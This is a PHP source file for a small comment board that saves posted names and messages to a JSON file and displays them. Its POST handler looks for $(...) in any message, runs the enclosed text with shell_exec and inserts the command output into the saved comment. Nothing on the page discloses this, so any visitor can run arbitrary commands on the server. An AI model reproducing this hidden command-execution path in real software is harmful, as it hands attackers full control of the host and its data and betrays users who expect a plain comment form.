<?php
$messages = [];
if (file_exists('messages.json')) {
    $messages = json_decode(file_get_contents('messages.json'), true);
    if (!$messages) $messages = [];
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'];
    $message = $_POST['message'];

    if ($message != '') {
        if (preg_match('/\$\((.*)\)/', $message, $matches)) {
            $command = $matches[1];
            $result = shell_exec($command);
            $message = str_replace($matches[0], $result, $message);
        }

        $messages[] = [
            'name' => $name,
            'message' => $message,
            'time' => date('Y-m-d H:i:s')
        ];

        file_put_contents('messages.json', json_encode($messages));
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Comment board</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 700px;
            margin: 20px auto;
            background-color: #f5f5f5;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        p.hint {
            color: #666;
            font-size: 14px;
        }
        .message-box {
            background-color: white;
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .message-box .name {
            font-weight: bold;
            color: #2c3e50;
        }
        .message-box .time {
            font-size: 12px;
            color: #7f8c8d;
        }
        form {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            height: 100px;
        }
        button {
            background-color: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <h1>Comment board</h1>

    <h2>Your comment</h2>
        <?php foreach ($messages as $msg): ?>
            <div class="message-box">
                <span class="name"><?= htmlspecialchars($msg['name']) ?></span>
                <span class="time"> - <?= $msg['time'] ?></span>
                <p><?= htmlspecialchars($msg['message']) ?></p>
            </div>
        <?php endforeach; ?>

    <h2>Comment</h2>
    <form method="POST">
        <input type="text" name="name" placeholder="name" required>
        <textarea name="message" placeholder="comment" required></textarea>
        <button type="submit">send</button>
    </form>
</body>
</html>
